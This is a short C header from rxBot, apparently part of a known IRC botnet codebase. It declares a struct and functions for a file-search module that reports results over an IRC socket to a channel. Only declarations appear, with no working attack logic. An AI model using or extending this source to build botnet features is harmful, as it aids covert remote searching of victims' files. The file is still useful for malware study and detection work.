/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef NO_FINDFILE
typedef struct FFIND
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	char filename[MAX_PATH];
	char dirname[MAX_PATH];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FFIND;

DWORD WINAPI FindFileThread(LPVOID param);
unsigned int FindFile(SOCKET sock, char *chan, BOOL notice, char *filename, char *dirname, unsigned int numfound);
#endif
